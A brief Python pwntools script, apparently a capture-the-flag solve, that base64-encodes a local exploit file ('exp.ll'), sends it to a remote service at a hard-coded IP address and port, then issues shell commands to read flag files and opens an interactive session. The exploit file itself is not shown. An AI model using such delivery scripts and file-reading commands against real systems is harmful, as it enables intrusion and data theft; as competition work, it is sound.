from pwn import *
from base64 import b64encode
s=open('exp.ll','rb').read()
bs=b64encode(s)+b'\nEND\n'
p=remote('123.59.196.133',10097)
p.recvuntil(b'line) : \n')
p.send(bs)
context.log_level='debug'
p.sendline(b"cat flag;cat f*;cat /flag")
p.interactive()